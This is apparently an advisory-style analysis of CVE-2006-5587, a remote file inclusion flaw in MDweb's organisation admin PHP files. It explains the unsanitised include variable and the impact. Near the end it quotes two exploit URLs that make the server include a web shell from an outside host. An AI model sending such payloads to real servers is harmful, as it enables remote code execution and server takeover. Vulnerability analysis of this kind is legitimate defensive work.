Based on the provided information, here's an analysis of CVE-2006-5587:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) issue in the MDweb application.
*   The application uses the `$chemin_appli` variable in `include_once` statements without proper sanitization.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application includes files using the `include_once` function and incorporates the user-controlled `$chemin_appli` variable into the file paths.

**Impact of Exploitation:**

*   An attacker can inject a malicious URL into the `$chemin_appli` parameter.
*   This allows the attacker to execute arbitrary code on the server by including a remote file containing malicious code.
*   The impact is severe as it can lead to complete compromise of the server and data.

**Attack Vectors:**

*   The attack vector is through HTTP GET requests to specific PHP files within the MDweb application.
*   The vulnerable files are `form_org.inc.php` and `country_insert.php` located in `/mdweb/admin/inc/organisations/`.
*   The `chemin_appli` parameter is appended to the URL, allowing the attacker to control the file path being included.

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP GET requests to the vulnerable application.
*   The attacker needs to have a web server hosting the malicious script they want to include and execute on the target server.

**Additional Information:**

*   The exploit targets the `mdweb132-postgres` version.
*   The vulnerable code snippet highlights the vulnerable include statements using the `$chemin_appli` variable:
    ```php
    include_once $chemin_appli."admin/inc/organisations/initLabelForm_org.inc.php";
    include_once $chemin_appli."admin/inc/organisations/initChampsForm_org.inc.php";
    include_once $chemin_appli."config/fonctions_ctrl_js.inc.php";
    ```
*   The provided exploit examples are:
    *   `http://www.site.com/Agora_PATH//mdweb/admin/inc/organisations/form_org.inc.php?chemin_appli=http://sonic-banda-di-lamer.gay/shell.php?`
    *   `http://www.site.com/Agora_PATH//mdweb/admin/inc/organisations/country_insert.php?chemin_appli=http://sonic-banda-di-lamer.gay/shell.php?`
*   The exploit suggests that the `$chemin_appli` variable can be manipulated to point to a remote URL (e.g., `http://sonic-banda-di-lamer.gay/shell.php`), causing the server to include and execute the attacker's code.
